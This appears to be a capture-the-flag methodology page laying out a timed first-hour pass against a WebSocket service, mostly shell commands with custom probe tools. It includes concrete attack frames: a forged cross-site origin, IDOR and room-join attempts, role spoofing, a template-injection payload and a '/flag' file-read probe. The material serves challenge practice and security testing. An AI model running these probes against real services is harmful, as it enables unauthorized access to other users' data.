# First hour — the timed pass, minute by minute

## Minute 0-5 — the recon

```bash
python3 tools/web/bundle_miner.py "$BASE" --out /tmp/bundle
grep -riE 'wss?://|new WebSocket|socket\.io|SockJS|stomp|pusher|ably|graphql-ws|mqtt' /tmp/bundle | head -10
grep -riE '"(action|type|event|cmd|id|room|channel|user_id|role|from|token|q|filter|file|subscribe|destination)"' /tmp/bundle | head -40
curl -sI "$BASE/login" | grep -i 'set-cookie'
```

Outputs: the endpoint, the library/framing, the schema, the auth, the
SameSite.

## Minute 5-10 — the handshake cells

```bash
python3 tools/web/ws_probe.py "$WS/ws" --message '{}'                                    # baseline
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://evil.example' --message '{}'   # origin
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"me"}'  # binding
python3 tools/web/ws_probe.py "$WS/ws" --message '{"action":"me"}'                       # unauth
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Sec-WebSocket-Protocol: graphql-ws' --message '{}'  # subproto
```

Outputs: the origin/binding/unauth/token/subproto verdicts.

## Minute 10-20 — the message cells

```bash
# the object-IDOR
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"read","id":"victim"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"read","id":"admin"}'
# the membership
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"join","room":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"subscribe","channel":"internal"}'
# the action-dispatch
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"debug"}'
# the spoof
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"from":"victim","action":"flag"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"x","role":"admin"}'
```

## Minute 20-30 — the injection + the subscription

```bash
# the injection carriers
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"q":"{{7*7}}"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"file":"/flag"}'
# the subscription-IDOR / the transport-specific
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"subscribe","channel":"<other>"}'
# a Socket.IO event
python3 tools/web/ws_probe.py "$WS/socket.io/?EIO=4&transport=websocket" --headers 'Cookie: session=x' --message '42["admin",{}]'
```

## Minute 30-45 — the boundary + the write-side

```bash
# a write-side frame (low-volume, non-destructive)
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"broadcast","text":"probe"}'
# the resumption/history
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"history","room":"x","from":0}'
```

## Minute 45-60 — the record + the escalate

```text
- each oracle -> the verbatim record + the class route
- each uniform -> the negative ledger
- the coverage matrix -> the unmeasured cells
- the budget -> the escalation rungs if uniform-all
- field-notes.md -> the endpoint/framing/auth/verdicts
```

## The hour's output

```
endpoint:  <the path>
framing:   <the transport>
auth:      <the binding>
oracle:    [<the cross-boundary frames>]
uniform:   [<the dead cells>]
flag:      <the verbatim flag, if reached>
route:     <the flag-closing class>
```

The first hour is the full pass — recon + handshake + message + a
boundary — inside the challenge budget.
